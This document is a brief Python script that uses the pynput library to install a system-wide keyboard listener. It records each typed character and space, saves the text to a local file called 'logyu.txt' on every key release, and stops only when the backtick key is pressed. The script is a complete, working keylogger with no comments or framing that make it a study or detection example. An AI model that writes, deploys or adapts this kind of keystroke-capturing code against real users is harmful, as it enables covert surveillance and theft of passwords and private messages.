from pynput import keyboard
keys=[]
def on_press(key):
    try:
        if(key.char=='`'):
            return False
        else:
            # print("You pressed {0}".format(key.char))
            keys.append(key.char)
    except AttributeError:
        if(key==keyboard.Key.space):
            keys.append(str(key))
        # print("You pressed {0}".format(key))

def on_release(key):
    try:
        with open("logyu.txt","w") as file:
            file.write("")
            s=""
            for i in keys:
                if(i=="Key.space"):
                    s+=" "
                else:
                    s+=i
            file.write(s)
            file.close()
    except:
        file.close()
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
    # listener.stop()